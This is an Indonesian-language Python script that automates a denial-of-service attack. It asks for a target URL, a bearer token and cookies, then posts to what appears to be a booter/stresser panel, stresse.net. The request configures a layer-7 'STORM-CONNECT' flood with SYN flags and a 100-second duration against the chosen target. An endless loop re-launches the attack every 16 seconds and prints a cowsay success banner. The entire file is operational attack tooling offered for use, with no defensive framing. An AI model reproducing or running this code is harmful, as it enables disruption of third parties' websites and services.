import requests
import time
import cowsay
from tqdm import tqdm
import sys
import json

def slow_print(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def get_input(prompt):
    slow_print(prompt, 0.05)
    return input()

def animate_cowsay(message):
    for _ in tqdm(range(100), desc="Processing", ncols=75):
        time.sleep(0.01)
    cowsay.cow(message)

def main():
    # Prompt user for name, token, and cookies with animation
    name = get_input("Masukkan nama: ")
    host = get_input("Masukkan target URL: ")
    token = get_input("Masukkan token: ")
    cookies = get_input("Masukkan cookies: ")

    # Update the headers with the user-provided token and cookies
    headers = {
        "Cookie": cookies,
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
    }

    # Request URL and payload
    url = "https://stresse.net/panel/load"
    payload = {
        "addParams": {
            "reqMethod": "GET",
            "ignore": True,
            "randpath": False,
            "debug": False,
            "referer": "",
            "extra": False,
        },
        "ackseq": 0,
        "seq": 0,
        "multipathStatus": 0,
        "multipathArr": [],
        "flooder": [{"name": "Strict", "checked": 1}, {"name": "Flexible", "checked": 0}],
        "browser": "Chrome",
        "group": 0,
        "emulation": 0,
        "sensitiveCodes": "",
        "emulationTime": "",
        "rosettaDev": 0,
        "headerData": "",
        "rateLimit": 0,
        "ignoreStatus": 0,
        "captcha": 0,
        "customCaptcha": 0,
        "sourceport": "",
        "isp": "OVH",
        "attackOriginCustom": "any",
        "customCountry": "Worldwide",
        "checksum": 1,
        "payloadType": "",
        "payloadCheckType": "static",
        "flagsSelectGroup": [
            {"name": "FIN", "checked": 0},
            {"name": "SYN", "checked": 1},
            {"name": "RST", "checked": 0},
            {"name": "PSH", "checked": 0},
            {"name": "ACK", "checked": 0},
            {"name": "URG", "checked": 0},
        ],
        "streams": "",
        "connections": "",
        "privatePool": 0,
        "presetsActive": 0,
        "NoShuffle": 0,
        "NoPush": False,
        "EnablePush": False,
        "NoCache": 0,
        "ExtraHeaders": True,
        "multiua": True,
        "Pragma": False,
        "optimization": 0,
        "randomVersion": False,
        "randomua": False,
        "randomQuery": False,
        "headless": True,
        "tor": 0,
        "attackMethod": "24",
        "attackMethodName": "STORM-CONNECT",
        "targetUrl": host,
        "concActive": 1,
        "layerID": 7,
        "precheck": 0,
        "statusCode": "",
        "port": "",
        "tlsconn": "",
        "linux": "0",
        "floodersec": "0",
        "host": "",
        "mask": 32,
        "duration": "100",
        "methodListActive": 0,
        "postData": "",
        "referrer": "",
        "cookies": "",
        "rate": "",
        "userAgentActive": 0,
        "userAgentSmart": "Random",
        "userAgentCustom": "",
        "attackOriginActive": "Worldwide",
        "token": token,
    }

    while True:
        try:
            response = requests.post(url, headers=headers, data=json.dumps(payload))
            if response.status_code == 200:
                message = f"Copyright © mnytc\nNama: {name}\nRequest berhasil dikirim!"
                animate_cowsay(message)
            else:
                slow_print(f"Error: {response.status_code} - {response.text}")
        except Exception as e:
            slow_print(f"Terjadi kesalahan: {e}")
        time.sleep(16)  # Delay 11 detik sebelum request berikutnya

if __name__ == "__main__":
    main()
